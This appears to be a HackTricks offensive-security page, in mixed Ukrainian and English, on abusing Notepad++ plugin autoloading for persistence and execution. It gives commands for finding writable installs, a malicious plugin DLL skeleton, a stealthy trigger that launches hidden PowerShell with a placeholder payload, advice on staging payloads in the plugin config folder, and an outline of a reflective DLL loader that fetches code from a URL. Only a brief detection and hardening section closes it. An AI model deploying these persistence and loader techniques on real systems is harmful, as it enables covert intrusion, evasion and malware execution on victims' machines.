# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ буде **autoload кожну plugin DLL, знайдену в його `plugins` підпапках**, під час запуску. Копіювання шкідливого plugin у будь-яку **writable Notepad++ installation** дає code execution всередині `notepad++.exe` щоразу, коли editor запускається, що можна використати для **persistence**, прихованого **initial execution**, або як **in-process loader**, якщо editor запущено elevated.

Since **Notepad++ 7.6+** очікуваний manual-install layout — це **одна підпапка на кожен plugin** (`plugins\<PluginName>\<PluginName>.dll`). У **portable mode** (наявність `doLocalConf.xml` поруч із `notepad++.exe`), весь application tree лишається локальним для цього каталогу, що часто перетворює copied/admin tool bundles на простий user-writable execution surface.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (зазвичай requires admin to write).
- Writable options for low-privileged operators:
- Use the **portable Notepad++ build** in a user-writable folder.
- Copy `C:\Program Files\Notepad++` to a user-controlled path (e.g. `%LOCALAPPDATA%\npp\`) and run `notepad++.exe` from there.
- Hunt for **admin tool bundles**, extracted zip copies, or help-desk toolkits that already contain `doLocalConf.xml` and live outside `Program Files`.
- Each plugin gets its own subfolder under `plugins` and is loaded automatically at startup; menu entries appear under **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Точки завантаження плагіна (execution primitives)
Notepad++ очікує певні **exported functions**. Усі вони викликаються під час ініціалізації, що дає кілька поверхонь виконання:
- **`DllMain`** — запускається одразу під час завантаження DLL (перша точка виконання).
- **`setInfo(NppData)`** — викликається один раз під час завантаження, щоб передати Notepad++ handles; типове місце для реєстрації menu items.
- **`getName()`** — повертає назву plugin, що відображається в menu.
- **`getFuncsArray(int *nbF)`** — повертає menu commands; навіть якщо масив порожній, ця функція викликається під час startup.
- **`beNotified(SCNotification*)`** — отримує події Notepad++ / Scintilla (корисно, щоб відкласти payloads до дії user або події editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, корисний для обміну більшими обсягами data.
- **`isUnicode()`** — compatibility flag, який перевіряється під час load.

Більшість export'ів можна реалізувати як **stubs**; execution може відбуватися з `DllMain` або будь-якого callback вище під час autoload.

## Minimal malicious plugin skeleton
Compile a DLL з очікуваними export'ами та помістіть її в `plugins\\MyNewPlugin\\MyNewPlugin.dll` у writable папці Notepad++:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Зберіть DLL (Visual Studio/MinGW).
2. Створіть підпапку плагіна в `plugins` і помістіть туди DLL.
3. Перезапустіть Notepad++; DLL завантажується автоматично, виконуючи `DllMain` і подальші callbacks.

## Низькошумний тригерний pattern через `beNotified`
Для OPSEC багато payloads не повинні спрацьовувати з `DllMain`. Тихіший pattern — дати plugin завантажитися без проблем, а потім виконувати код лише після реальної події editor, такої як **startup complete**, **buffer activation** або **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Це краще відповідає публічним offensive research, ніж шумний `DllMain` beacon: DLL усе ще autoloaded під час startup, але malicious action відкладено, доки Notepad++ не виглядає genuinely in use.

## Using the plugin config directory as secondary storage
Notepad++ exposes `NPPM_GETPLUGINSCONFIGDIR`, which returns the **current user's plugin configuration directory**. A malicious plugin can use this to keep the on-disk DLL minimal while storing encrypted config, staged payloads, or tasking files in a path that blends in with normal plugin state.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operationally this is useful when you want:
- a tiny autoloaded bootstrap DLL;
- per-user tasking without touching the main plugin binary again;
- to separate the **autoload trigger** from the heavier second stage.

## Reflective loader plugin pattern
A weaponized plugin can turn Notepad++ into a **reflective DLL loader**:
- Present a minimal UI/menu entry (e.g., "LoadDLL").
- Accept a **file path** or **URL** to fetch a payload DLL.
- Reflectively map the DLL into the current process and invoke an exported entry point (e.g., a loader function inside the fetched DLL).
- Benefit: reuse a benign-looking GUI process instead of spawning a new loader; payload inherits the integrity of `notepad++.exe` (including elevated contexts).
- Trade-offs: dropping an **unsigned plugin DLL** to disk is noisy; a practical variation is to use the autoloaded plugin only as a stub and keep the real implant encrypted/staged elsewhere.

## Detection and hardening notes
- Block or monitor **writes to Notepad++ plugin directories** (including portable copies in user profiles); enable controlled folder access or application allowlisting.
- Alert on **new unsigned DLLs** under `plugins`, changes to portable Notepad++ trees, and unusual **child processes/network activity** from `notepad++.exe`.
- Baseline legitimate plugins and investigate any new DLL that exports the normal Notepad++ plugin interface but also spawns shells, PowerShell, or network beacons.
- Enforce plugin installation via **Plugins Admin** only, and restrict execution of portable copies from untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
